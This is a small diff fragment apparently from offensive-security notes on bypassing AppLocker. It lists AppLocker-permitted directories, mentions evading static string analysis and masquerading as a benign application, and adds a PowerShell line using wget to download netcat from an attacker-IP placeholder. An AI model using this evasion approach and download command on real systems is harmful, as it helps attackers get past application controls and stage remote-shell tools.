@@ -136,3 +136,7 @@ THESE ARE SOME DIRECTORIES ARE PERMITTED BY APPLOCKER, THESE ARE ALLOWED
 - iexplore.exe is the name of the process for internet explorer in microsoft
 
 ALSO HELPS TO BYPASS STATIC STRING ANANLYSIS AND MASQUERADING AS BENIGN APPLICATION 
+
+```POWERSHELL
+wget http://<attackerip/netcat> -outfile 
+```
